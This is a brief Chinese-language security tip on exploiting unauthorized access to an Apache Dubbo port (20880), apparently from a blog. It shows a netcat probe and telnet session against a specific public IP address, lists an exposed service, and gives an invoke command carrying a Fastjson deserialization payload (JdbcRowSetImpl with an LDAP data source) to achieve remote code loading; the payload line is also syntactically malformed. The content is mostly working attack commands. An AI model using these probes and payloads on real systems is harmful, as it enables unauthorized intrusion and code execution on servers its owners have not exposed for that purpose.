1. Dubbo端口未授权访问

```
一条命令判断：
echo ls | nc -i 1 116.62.162.75 20880

telnet远程连接
root@vulhunt:~# telnet 116.62.162.75 20880
Trying 116.62.162.75...
Connected to 116.62.162.75.
Escape character is '^]'.

ls + 类 + 方法，查看注册的生产者，使用invoke未授权调用
dubbo>ls
com.yuntai.udb.facade.auth.UdbAuthorizeFacade
dubbo>

invoke调用方法，利用Fastjson漏洞

invoke com.baidu.updateDataMessage("aa",{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/ExportObject","autoCommit":true}}, "poc":11})

```
参考：

    我的公众号文章

